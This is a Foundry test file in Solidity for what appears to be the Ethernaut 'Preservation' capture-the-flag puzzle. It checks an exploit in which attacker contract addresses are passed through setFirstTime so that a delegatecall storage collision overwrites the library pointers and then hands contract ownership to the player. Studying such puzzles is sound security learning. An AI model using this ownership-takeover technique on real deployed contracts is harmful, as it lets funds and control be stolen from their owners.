// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "@puzzles/16/Preservation.sol";
import {PreservationAttacker1, PreservationAttacker2} from "@attackers/16/PreservationAttacker.sol";
import {PreservationSolution} from "@script/16/PreservationSolution.s.sol";
import {DeployPreservationAttacker} from "@script/16/DeployPreservationAttacker.s.sol";
import {DeployTelephoneAttacker} from "@script/4/DeployTelephoneAttacker.s.sol";

contract PreservationTest is Test {
    Preservation internal puzzleContract;
    LibraryContract internal libraryContract1;
    LibraryContract internal libraryContract2;
    PreservationAttacker1 internal attacker1;
    PreservationAttacker2 internal attacker2;

    address player = msg.sender;

    function setUp() public {
        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();
        puzzleContract = new Preservation(address(libraryContract1), address(libraryContract2));
        (attacker1, attacker2) = new DeployPreservationAttacker().run();
    }

    function testPreservation() public {
        puzzleContract.setFirstTime(uint256(uint160(address(attacker1))));
        assertEq(puzzleContract.timeZone1Library(), address(attacker1));
        puzzleContract.setFirstTime(uint256(uint160(address(attacker2))));
        assertEq(puzzleContract.timeZone2Library(), address(attacker2));
        puzzleContract.setSecondTime(uint256(uint160(player)));
        assertEq(puzzleContract.owner(), player);
    }

    function testPreservationSolution() public {
        PreservationSolution solution = new PreservationSolution();
        solution.solve(address(puzzleContract), address(attacker1), address(attacker2), player);
        assertEq(puzzleContract.owner(), player);
    }
}
